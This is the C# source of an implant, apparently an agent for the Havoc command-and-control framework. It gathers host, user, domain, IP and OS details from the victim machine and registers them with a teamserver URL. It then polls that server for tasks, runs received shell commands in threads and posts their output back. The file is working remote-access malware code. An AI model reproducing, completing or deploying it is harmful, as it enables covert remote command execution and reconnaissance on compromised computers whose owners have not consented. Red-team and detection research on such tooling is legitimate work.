using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Collections;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Management;

namespace HavocImplant
{
    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
    public class Implant
    {
        // Altered by build
        string url = Config.url;
        int sleepTime = Config.sleepTime;

        // Communication with Teamserver
        byte[] id;
        byte[] magic;
        bool registered;
        public string outputData = "";

        // Registration Properties
        string hostname = Dns.GetHostName();
        string userName = Environment.UserName;
        string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        string IP = getIPv4();
        string PID = Process.GetCurrentProcess().Id.ToString();
        string PPID = "ppid here";
        string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
        string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        string processName = Process.GetCurrentProcess().ProcessName;
        string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");

        static void Main(string[] args)
        {
            Implant implant = new Implant();
            while (!implant.registered) implant.Register();
            while (true)
            {
                string commands = implant.CheckIn(implant.outputData);
                implant.outputData = "";
                if (commands.Length > 4)
                {
                    string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
                    Console.WriteLine("Command Queue length: {0}", commandsArray.Length);
                    foreach (string command in commandsArray)
                    {
                        Console.WriteLine("Read command: {0}", command);

                        List<byte> commandBytes = Encoding.UTF8.GetBytes(command.Split(' ')[0]).ToList();
                        commandBytes.Remove(0x00);
                        Console.WriteLine("Length is: {0}", Encoding.UTF8.GetString(commandBytes.ToArray()).Length);
                        string sanitizedCommand = Encoding.UTF8.GetString(commandBytes.ToArray());
                        switch (sanitizedCommand.Split(' ')[0])
                        {
                            case "shell":
                                Thread childThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5)));
                                childThread.Start();
                                break;
                            //outputData += implant.runCommand(command.Substring(5)).Replace("\\", "\\\\"); break; // Parse the shell command after the "shell"
                            case "goodbye":
                                Console.WriteLine("It is die time my dudes"); Environment.Exit(0); break;
                        }
                        //Console.WriteLine("Output Data: {0}", outputData);
                    }
                }
                Thread.Sleep(implant.sleepTime);
            }
        }
        public void Register()
        {
            magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
            id = Encoding.ASCII.GetBytes(random_id().ToString());

            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(id)));
            byte[] agentHeader = createHeader(magic, registrationRequestBody);

            string response = "";
            while (!response.Equals("registered"))
            {
                Console.WriteLine("Trying to register");
                response = sendReq(registrationRequestBody, agentHeader);
                Console.WriteLine("Response: {0}", response);
                Thread.Sleep(sleepTime);
            }
            registered = true;
        }
        public string CheckIn(string data)
        {
            //Console.WriteLine("Checking in for taskings");

            string checkInRequestBody = "{\"task\": \"gettask\", \"data\": \"{0}\"}".Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
            //string checkInRequestBody = "{\"task\":\"gettask\",\"data\":\"{0}\"}".Replace("{0}", BitConverter.ToString(data));
            byte[] agentHeader = createHeader(magic, checkInRequestBody);
            string response = sendReq(checkInRequestBody, agentHeader);
            //Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
            return response;

        }
        public byte[] createHeader(byte[] magic, string requestBody)
        {
            int size = requestBody.Length + 12;
            byte[] size_bytes = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
            if (BitConverter.IsLittleEndian)
            {
                Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
                //Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
                Array.Reverse(size_bytes);
            }
            //else Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
            Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + id.Length];
            Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
            Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
            Array.Copy(id, 0, agentHeader, size_bytes.Length + magic.Length, id.Length);
            return agentHeader;
        }
        int random_id()
        {
            Random rand = new Random();
            int id = rand.Next(1000, 10000);
            return id;
        }
        string obtainRegisterDict(int id)
        {
            Dictionary<string, string> registrationAttrs = new Dictionary<string, string>();
            registrationAttrs.Add("AgentID", id.ToString());
            registrationAttrs.Add("Hostname", hostname);
            registrationAttrs.Add("Username", userName);
            registrationAttrs.Add("Domain", domainName);
            registrationAttrs.Add("InternalIP", IP);
            registrationAttrs.Add("Process Path", "process path here");
            registrationAttrs.Add("Process ID", PID);
            registrationAttrs.Add("Process Parent ID", PPID);
            registrationAttrs.Add("Process Arch", "x64");
            registrationAttrs.Add("Process Elevated", "elevated status here");
            registrationAttrs.Add("OS Build", osBuild);
            registrationAttrs.Add("OS Arch", osArch);
            registrationAttrs.Add("Sleep", (sleepTime / 1000).ToString());
            registrationAttrs.Add("Process Name", processName);
            registrationAttrs.Add("OS Version", osVersion);
            string strRegistrationAttrsAsJSON = stringDictionaryToJson(registrationAttrs);
            string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
            return strPostReq;
        }
        string stringDictionaryToJson(Dictionary<string, string> dict)
        {
            var entries = dict.Select(d =>
                string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }
        public string sendReq(string requestBody, byte[] agentHeader)
        {
            string responseString = "";
            var request = (HttpWebRequest)WebRequest.Create(url);

            ArrayList arrayList = new ArrayList();
            arrayList.AddRange(agentHeader);

            string postData = requestBody;
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            arrayList.AddRange(postBytes);
            byte[] data = (byte[])arrayList.ToArray(typeof(byte));

            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            try
            {
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();

                byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                responseString = Encoding.UTF8.GetString(bytes);
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    var response = (HttpWebResponse)ex.Response;

                    byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                    responseString = Encoding.UTF8.GetString(bytes);
                }
            }
            return responseString;
        }
        static string getIPv4()
        {
            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return a.ToString();
            return "";

        }

        public static string HKLM_GetString(string path, string key)
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
            if (rk == null) return "";
            return (string)rk.GetValue(key);
        }
    }
}